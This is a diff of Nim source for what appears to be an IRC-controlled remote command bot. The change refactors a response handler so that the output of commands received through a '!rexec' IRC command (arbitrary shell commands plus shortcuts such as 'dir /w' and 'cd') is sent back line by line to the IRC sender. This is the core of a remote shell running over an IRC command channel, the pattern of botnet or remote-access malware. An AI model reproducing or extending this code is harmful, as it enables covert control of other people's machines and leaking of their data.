@@ -3,7 +3,7 @@ import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asy
 let
     g_dbg* = true
     g_msg_length = 400
-    g_msg_send_time = 1 #seconds
+    g_msg_send_time = 2 #seconds
     g_msg_max_transfer_time = 20
 var
     g_abort = false
@@ -74,6 +74,45 @@ proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Fut
         return false
     else:
         return true
+
+
+
+
+
+## Waits handles output from dispached functions. Required for async operations
+## usually used to get async output from rexec
+proc helper_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
+    while not response.finished() and not response.failed():
+        await sleepAsync(1000)
+    
+    if not response.failed():
+        try:
+            if response.read().exitCode == 0:
+                var
+                    value:string = response.read().output
+                    value_filtered:string
+
+                for line in value.splitLines():
+                    if line.strip() != "":
+                        value_filtered &= line & "\n"
+
+
+                for line in value_filtered.splitLines():
+                    if g_abort: break
+                    echo "SENDING: ", line
+                    await client.privmsg(event.origin, line)
+                    ## Putting a sleep here just results in messages not arriving
+                    ## instead of them arriving more quickly. So this has to stay commented for now
+                    await sleepAsync(g_msg_send_time*2000)
+                    
+            else:
+                discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
+        except OSError as e:
+            discard client.privmsg(event.origin, "failed to on a very deep level [" & repr(e) & "]")
+    else:
+        discard client.privmsg(event.origin, "cmd: future failed")
+
+
 
 
 
@@ -229,41 +268,6 @@ proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
 
 
 
-## Waits handles output from dispached functions. Required for async operations
-## usually used to get async output from rexec
-proc cmd_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
-    while not response.finished() and not response.failed():
-        await sleepAsync(1000)
-    
-    if not response.failed():
-        try:
-            if response.read().exitCode == 0:
-                var
-                    value:string = response.read().output
-                    value_filtered:string
-
-                for line in value.splitLines():
-                    if line.strip() != "":
-                        value_filtered &= line & "\n"
-
-
-                for line in value_filtered.splitLines():
-                    if g_abort: break
-                    await client.privmsg(event.origin, line)
-                    ## Putting a sleep here just results in messages not arriving
-                    ## instead of them arriving more quickly. So this has to stay commented for now
-                    ##await sleepAsync(g_msg_send_time*1000)
-            else:
-                discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
-        except OSError as e:
-            discard client.privmsg(event.origin, "failed to on a very deep level [" & repr(e) & "]")
-    else:
-        discard client.privmsg(event.origin, "cmd: future failed")
-
-
-
-
-
 ## Processes !rexec
 ## Contains some shortcuts for certain functions, everything else just gets sent to rexec_runCommand
 proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
@@ -275,7 +279,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
     of "cd":
         if len(tokens) == 2:
             #response = await rexec_runCommand("echo %CD%")
-            discard cmd_responseHandler(rexec_runCommand("echo %CD%"), client, event)
+            discard helper_responseHandler(rexec_runCommand("echo %CD%"), client, event)
             #caught = true
         else:
             var path = await helper_recombine(tokens,2)
@@ -286,11 +290,11 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
 
     of "cd..":
         #response = await rexec_runCommand("cd ..")
-        discard cmd_responseHandler(rexec_runCommand("cd .."), client, event)
+        discard helper_responseHandler(rexec_runCommand("cd .."), client, event)
         #caught = true
     of "ls":
         #response = await rexec_runCommand("dir /w")
-        discard cmd_responseHandler(rexec_runCommand("dir /w"), client, event)
+        discard helper_responseHandler(rexec_runCommand("dir /w"), client, event)
         #caught = true
     else:
         var args:string
@@ -298,7 +302,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
         
         if g_dbg: echo "ARGS: " & args
 
-        discard cmd_responseHandler(rexec_runCommand(args), client, event)
+        discard helper_responseHandler(rexec_runCommand(args), client, event)
 
     # if caught:
     #     for line in response.output.splitLines():
